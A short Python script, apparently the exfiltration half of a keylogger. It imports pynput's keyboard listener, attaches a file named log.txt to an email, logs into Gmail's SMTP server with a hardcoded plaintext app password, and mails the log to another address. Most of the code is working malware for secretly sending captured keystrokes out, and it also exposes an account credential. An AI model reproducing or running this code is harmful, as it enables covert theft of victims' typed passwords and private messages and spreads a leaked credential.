from pynput.keyboard import Listener
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from smtplib import SMTP
import sys

mensaje = MIMEMultipart("plain")
mensaje["From"] = "huaritex@gmail.com"
mensaje["To"] = "Brandonykevin07@gmail.com"
mensaje["Subject"] = "Correo de prueba"

adjunto = MIMEBase("application", "octet-stream")
adjunto.set_payload(open("log.txt", "rb").read())
adjunto.add_header("Content-Disposition", "attachment; filename=log.txt")
mensaje.attach(adjunto)

server = SMTP("smtp.gmail.com", 587)
server.starttls()
server.login("huaritex@gmail.com", "dhwq qdtm tfzr rygm")
server.sendmail( "huaritex@gmail.com", "Brandonykevin07@gmail.com", mensaje.as_string().encode('utf-8'))

server.quit()

